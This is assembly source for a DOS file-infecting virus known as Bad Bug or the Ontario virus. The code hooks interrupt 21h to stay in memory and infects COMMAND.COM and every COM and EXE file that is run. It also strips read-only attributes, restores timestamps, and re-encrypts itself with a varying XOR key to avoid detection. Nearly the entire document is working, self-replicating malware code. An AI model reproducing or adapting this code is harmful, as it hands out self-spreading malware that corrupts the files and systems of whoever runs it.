
comment	*

           Older version of Bad Bug, also known as Ontario virus.
                        --> Written by Death Angel <--
	-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
	This virus first puts itself in memory, if not already.  Infects the
	C:\COMMAND.COM file, then infects other files as they are loaded.
	It appends itself onto COM and EXE files.

	Identification method:
	======================
	Checking if already in memory - INT 21/AH=FF, returns AX=0
	Checking if COM is infected - 4th byte in file "V"
	Checking if EXE is infected - Instruction Pointer is at 1

	*

LOC_21		EQU	21H*4
REAL_SIZE	equ	offset EOF

CODE	SEGMENT	PARA PUBLIC 'CODE'
	ASSUME CS:CODE, DS:CODE
	ORG 0h

VBUG	PROC	FAR
	nop
	call	MASTER_UNCODE
VB01:
	call	VB00
VB00:
	pop	bp
	sub	BP, +7
	mov	ax, -1
	int	21h
	or	ah, ah
	je	GO_PROG

	push	ds
	xor	ax, ax
	mov	ds, ax					;BIOS data area
	sub	word ptr ds:[0413H], 2
	lds	bx, ds:[LOC_21]
	mov	word ptr cs:[BP]+offset OLD_21, bx	
	mov	word ptr cs:[BP]+offset OLD_21+2, ds ;Get interrupt 21h vector
	mov	bx, es
	dec	bx
	mov	ds, bx
	sub	word ptr ds:[0003H], 2048/16	;Paragraph size
	mov	ax, ds:[0012H]			;Get high memory segment
	sub	ax, 2048/16			;Make room for ourself
	mov	ds:[0012H], ax			;Save it
	mov	es, ax
	push	cs
	pop	ds
	mov	si, bp			;Put 0000 into SI (if EXE..)
	xor	di, di
	mov	cx, REAL_SIZE+4         ;Plus OLD_21 information!
	cld
	rep	movsb
	mov	ds, cx			;Put zero into DS
	cli				;Disable maskable interrupts
	mov	word ptr ds:LOC_21, offset NEW_21
	mov	word ptr ds:LOC_21+2, ax
	sti				;Enable interrupts
	mov	ax, 4BFFH		;Infect COMMAND.COM file!
	int	21h
	pop	ds
	push	ds
	pop	es

GO_PROG:				;Check if EXE or COM program?
	or	bp, bp			;Are we an EXE file?
	je	RUN_EXE

RUN_COM:				;Run this infected .COM file
	lea	si, [BP]+offset RUN_PROG
	mov	di, 100H
	push	di
	cld
	movsw	
	movsw
DUMB_ROUTINE PROC NEAR
	ret				;Do a local return
DUMB_ROUTINE ENDP

RUN_EXE:
	mov	ax, es			;Get PSP segment
	add	cs:word ptr RUN_PROG+2, ax	;Reallocate entry segment
					
	db	0EAh			;JMP 0000:0000

RUN_PROG	db	0B4H, 04CH
		db	0CDH, 021H
NEW_21:
	cmp	ax, -1
	jne	NW00
	inc	ax				;Overflow to 0000
	iret
NW00:
	cmp	ah, 4Bh				;Infect program being executed
	jne	RUN_OLD_21
	cmp	al, 03
	je	RUN_OLD_21
	cmp	al, -1
	jne	RO00
	push	cs
	pop	ds
	mov	dx, offset COMMAND_FILE
	call	INFECT_PROGRAM
	IRET
RO00:
	call	INFECT_PROGRAM

RUN_OLD_21:
	jmp	dword ptr cs:OLD_21	;Do original interrupt

INFECT_PROGRAM	PROC	NEAR
;
;When entering a normal Int 21/AH=4BH
;DS:DX -> Ptr to filename
;ES:BX -> Ptr to Parm Block
;AL    -> 0 - Load/Run, 3 - Overlay
;
	push	es
	push	ds
	push	dx
	push	cx
	push	bx
	push	ax
;	push	si
;	push	di

	mov	ax, 4300H		;Get file attribute
	call	DO_21
	jb	NO_CLOSE
	test	cl, 00000001b
	je	VB04
	and	cl, 11111110b		;Turn off bit 0 (so you can write)
	mov	ax, 4301H		;Set file attribute
	call	DO_21
	jb	NO_CLOSE
	  
VB04:
	mov	ax, 3D02h		;Open file for reading & writing
	call	DO_21
VB05:
	JNB	VB06
NO_CLOSE:
	JMP	END_21
VB06:
	
	mov	bx, ax			;Put new handle into BX
	push	cs
	pop	ds

	mov	ax, 5700H		;Get file date
	call	DO_21
	mov	ds:FILE_TIME, cx
	mov	ds:FILE_DATE, dx

	mov	dx, offset TMP_HEADER	;Load in COM/EXE ? file header
	mov	cx, 1BH			;Size of header (for EXE, it doesn't
					;matter the extra bytes loaded for
					;COM files.
	mov	ah, 3Fh			;Read from file
	call	DO_21
VB10:
	jb	CLOSE_END

	cmp	word ptr ds:SIGN, 'ZM'		;Is this an EXE file? (MZ)
	je	INFECT_EXE

INFECT_COM:
	mov	al, byte ptr SIGN+1
	cmp	al, byte ptr SIGN+3
	je	CLOSE_END

	xor	dx, dx
	xor	cx, cx
	mov	ax, 4202H			;Seek from EOF
	call	DO_21
VB15:
	jb	CLOSE_END

;Returns DX:AX number of bytes seeked (Size of file)

	cmp	ax, 0E000H			;Check file size
	ja	CLOSE_END
	push	ax
	mov	ax, ds:word ptr [SIGN+0]
	mov	word ptr ds:RUN_PROG+0, ax
	mov	ax, ds:word ptr [SIGN+2]
	mov	word ptr ds:RUN_PROG+2, ax
	pop	ax
	sub	ax, 3				;Calculate jmp to End of file
	mov	byte ptr ds:SIGN+0, 0E9H	;JMP FAR
	mov	word ptr ds:SIGN+1, ax
	mov	byte ptr ds:SIGN+3, al		;Identification code

	jmp	FINISH_INFECT

;From here in, both EXE & COM files are infected the same
;The virus is written, seek to start of file, and re-write the Header

INFECT_EXE:
	cmp	word ptr ds:START_IP, 1
	jne	VB19
VB18:
CLOSE_END:
	jmp	END_INFECT
VB19:
	mov	ax, ds:[FILE_SIZE]		;Get file size
	mov	cx, 200H
	mul	cx				;Convert to bytes offset

;If filesize, if bigger then 64K, the overflow is put into DX

	push	ax
	push	dx
	mov	cl, 04h
	ror	dx, cl
	shr	ax, cl				;Convert to paragraphs
	add	ax, dx
	sub	ax, ds:SIZE_HEADER
	PUSH	AX
	mov	ax, ds:START_IP
	mov 	word ptr ds:RUN_PROG, ax
	mov	ax, ds:START_CS
	add	ax, 0010H
	mov	word ptr ds:RUN_PROG+2, ax
	POP	AX
	mov	word ptr ds:START_CS, ax
	mov	word ptr ds:START_IP, +1
	inc	word ptr ds:FILE_SIZE

	pop	cx
	pop	dx
	mov	ax, 4200H			;Goto end of file
	call	DO_21
VB20:
	jb	VB25

FINISH_INFECT:
	xor	ds:byte ptr [DC00]+1, 08h	;Toggle NEG/NOT
	
	xor	ax, ax
	mov	ds, ax
	mov	AL, byte ptr ds:[46CH]	;Lowest byte of timer count
	push	cs
	pop	ds
	push	cs
	pop	es
	mov	ds:[CODE_BYTE], AL	;Put high byte of file seek
	xor	si, si
	mov	di, offset REAL_EOF
	push	di			;Push pointer
	mov	cx, offset EOF
	cld
	rep	movsb
	mov	si, offset REAL_EOF+04H	;REAL_EOF+VB01
	call	DECODE
	pop	dx			;Restore pointer
	mov	cx, REAL_SIZE
	mov	ah, 40h
	call	DO_21
	JB	END_INFECT

	xor	cx, cx
	xor	dx, dx			;Distance to seek into file
	mov	ax, 4200h		;Seek from start of file
	call	DO_21
	jb	END_INFECT

	mov	dx, offset TMP_HEADER	;Ptr to New modified header
	mov	cx, 1BH			;Size of header
	mov	ah, 40h			;Write to file
	call	DO_21

VB25:
END_INFECT:
	mov	dx, ds:FILE_DATE
	mov	cx, ds:FILE_TIME
	mov	ax, 5701h		;Set file date/time
	call	DO_21

CLOSE_FILE:
	mov	ah, 3Eh			;Close the file
	call	DO_21
END_21:	
;	pop	di
;	pop	si
	pop	ax
	pop	bx
	pop	cx
	pop	dx
	pop	ds
	pop	es
	RET

DO_21:
	pushf
	call	dword ptr cs:OLD_21
	ret

COMMAND_FILE	DB	'C:\COMMAND.COM',0

MASTER_DECODE:
CODE_BYTE	DB	80H

MASTER_UNCODE:
	POP	SI
	PUSH	SI
	MOV	AL, BYTE PTR CS:[SI+CODE_BYTE-OFFSET VB01]
DECODE:
	MOV	CX, OFFSET MASTER_DECODE-OFFSET VB01
DC00:
	NOT	AL
	XOR	CS:BYTE PTR [SI], AL
	INC	SI
	LOOP	DC00
	RET

INFECT_PROGRAM	ENDP

EOF:

OLD_21		DD	?

FILE_TIME	DW	?
FILE_DATE	DW	?

TMP_HEADER:
SIGN		DW	?
LEN_IMAGE_MOD	DW	?
FILE_SIZE	DW	?		;In 512-increments
NUM_REAL	DW	?
SIZE_HEADER	DW	?
MIN_ABOVE	DW	?
MAX_ABOVE	DW	?
STACK_SS	DW	?
STACK_SP	DW	?
CHECKSUM	DW	?
START_IP	DW	?
START_CS	DW	?
DISPLAY_REAL	DW	?
OVERLAY_NUM	DW	?

REAL_EOF:

VBUG	ENDP

CODE	ENDS
	END	VBUG

